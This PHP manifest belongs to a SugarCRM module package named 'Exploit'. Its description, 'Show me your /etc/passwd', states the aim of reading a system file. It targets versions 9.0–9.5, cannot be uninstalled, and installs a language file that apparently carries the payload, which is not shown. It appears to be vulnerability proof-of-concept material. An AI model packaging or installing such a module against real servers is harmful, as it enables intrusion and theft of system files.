<?php

    $manifest = array(
    'acceptable_sugar_versions' => array(
        'regex_matches' => array(
            '9\.[012345]\.\d\.\d'
            ),
        ),
    'acceptable_sugar_flavors' => array(
        'PRO',
        'CORP',
        'ENT',
        'ULT',
        ),
    'readme' => '',
    'key' => 'Exploit',
    'author' => '',
    'description' => 'Show me your /etc/passwd',
    'icon' => '',
    'is_uninstallable' => false,
    'name' => 'Exploit',
    'published_date' => '2020-01-01 21:42:42',
    'type' => 'module',
    'version' => '1.1',
    'remove_tables' => false,
    );
$installdefs = array(
    'id' => 'exploit',
    'language' => array(
        array(
            'from' => '<basepath>/en_us.lang.php',
            'to_module' => 'application',
            'language' => 'en_us',
            ),
        ),
    );
